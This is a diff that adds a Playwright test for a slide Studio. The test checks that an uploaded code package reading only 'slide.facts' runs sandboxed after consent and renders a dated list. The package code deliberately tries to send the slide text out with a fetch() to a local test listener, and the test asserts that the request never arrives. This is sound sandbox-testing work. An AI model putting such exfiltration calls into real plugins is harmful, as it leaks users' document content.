@@ -19,6 +19,10 @@ import { expect, gotoStudio, livePreview, setEditorContent, test } from './studi
 //   2. APPROVED — the package draws; the log is still empty; the preview holds no reference to the
 //      server, no forged note, and the package ran in a sandboxed frame with an opaque origin.
 //   3. CONTROLS — the page itself reaches both listeners.
+//
+// A second test runs a package written against `slide.facts` ONLY (lib/packages/slide-facts.mjs,
+// the stable input): it never reads `slide.html`, draws a dated list from the facts, and tries to
+// send them out. It draws from the plain text, and the log stays empty.
 
 test.describe.configure({ timeout: 300_000 });
 
@@ -168,6 +172,71 @@ test(`a code package runs in the Studio only after consent, sandboxed, and reach
 			server.closeAllConnections();
 			await new Promise((r) => server.close(() => r(null)));
 			udp.close();
+		}
+	});
+}
+
+// ── A package that reads only slide.facts draws in the Studio, and reaches nothing ──
+const datelineCode = (origin: string) => `
+function dateline(slide) {
+  var f = slide.facts;
+  try { fetch("${origin}/facts?d=" + encodeURIComponent(f.text)).catch(function(){}); } catch (e) {}
+  var list = f.blocks.find(function (b) { return b.type === "list"; });
+  var frozen = true;
+  try { f.blocks.push({}); frozen = false; } catch (e) {}
+  var esc = function (s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;"); };
+  var rows = (list ? list.items : []).map(function (it) {
+    var m = /^(\\d{4}-\\d{2}-\\d{2})\\s+(.*)$/.exec(it.text) || [null, "", it.text];
+    return '<li class="dateline-row"><b class="dateline-date">' + esc(m[1]) + "</b> " + esc(m[2]) + "</li>";
+  }).join("");
+  var paint = f.tokens.indexOf("--cat-1-mark") >= 0 ? "var(--cat-1-mark)" : "currentColor";
+  return '<section class="' + f.classes.join(" ") + ' dateline-drawn"><h2>' + esc(f.title) + '</h2><ol class="dateline-rows" style="color:' + paint + '">' + rows + "</ol><p class=\\"dateline-meta\\">facts v" + f.version + ", frozen " + frozen + "</p></section>";
+}
+export { dateline as default };
+`;
+
+for (const tag of [' @gecko', ' @webkit-tablet']) {
+	test(`a code package that reads only slide.facts draws in the Studio, and reaches nothing${tag}`, async ({ page }) => {
+		const hits: string[] = [];
+		const server = http.createServer((req, res) => {
+			hits.push(req.url || '');
+			res.writeHead(200, { 'Access-Control-Allow-Origin': '*' });
+			res.end();
+		});
+		await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
+		const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
+		try {
+			await gotoStudio(page);
+			await openLibrary(page);
+			const zip = new JSZip();
+			zip.file('dateline/dateline.manifest.json', JSON.stringify({ name: 'dateline', type: 'component', format: 1 }));
+			zip.file('dateline/dateline.styles.css', 'section.dateline .dateline-rows { display: grid; gap: 0.25em; }\n');
+			zip.file('dateline/dateline.gallery.md', '<!-- _class: dateline -->\n\n## Plan\n\n- 2026-01-10 Kickoff\n');
+			zip.file('dateline/dateline.transform.js', datelineCode(origin));
+			await page.locator('input[type="file"][accept=".zip"]').setInputFiles({ name: 'dateline.zip', mimeType: 'application/zip', buffer: await zip.generateAsync({ type: 'nodebuffer' }) });
+			await expect(page.locator('[data-sonner-toast]').first()).toContainText('1 component(s)');
+			await page.keyboard.press('Escape');
+			await setEditorContent(page, '<!-- _class: dateline -->\n\n## Launch plan\n\n- 2026-01-10 **Kickoff**\n- 2026-03-02 Beta & pilot\n- 2026-06-30 [General availability](https://example.test)\n');
+			const notice = page.locator('[data-slot="code-packages"]');
+			await expect(notice).toHaveAttribute('data-state', 'unapproved', { timeout: 30_000 });
+			await notice.getByRole('button', { name: 'Run the code of dateline' }).click();
+			const preview = livePreview(page);
+			const rows = preview.locator('.dateline-rows .dateline-row');
+			await expect(rows).toHaveCount(3, { timeout: 30_000 });
+			await expect(rows.nth(0)).toHaveText('2026-01-10 Kickoff');
+			await expect(rows.nth(1)).toHaveText('2026-03-02 Beta & pilot');
+			await expect(rows.nth(2)).toHaveText('2026-06-30 General availability');
+			await expect(preview.locator('.dateline-meta')).toHaveText('facts v1, frozen true');
+			await expect(preview.locator('.dateline-rows')).toHaveAttribute('style', 'color:var(--cat-1-mark)');
+			// The engine's classes, which a package drawing from facts cannot know, are put back by the door.
+			await expect(preview.locator('section.dateline.dateline-drawn.content')).toHaveCount(1);
+			const evidence = process.env.LATTICE_EVIDENCE_DIR;
+			if (evidence) await preview.locator('section').first().screenshot({ path: `${evidence}/code-package-facts.png` });
+			await page.waitForTimeout(2500);
+			expect(hits, `the facts package reached the server: ${hits.join(', ')}`).toEqual([]);
+		} finally {
+			server.closeAllConnections();
+			await new Promise((r) => server.close(() => r(null)));
 		}
 	});
 }
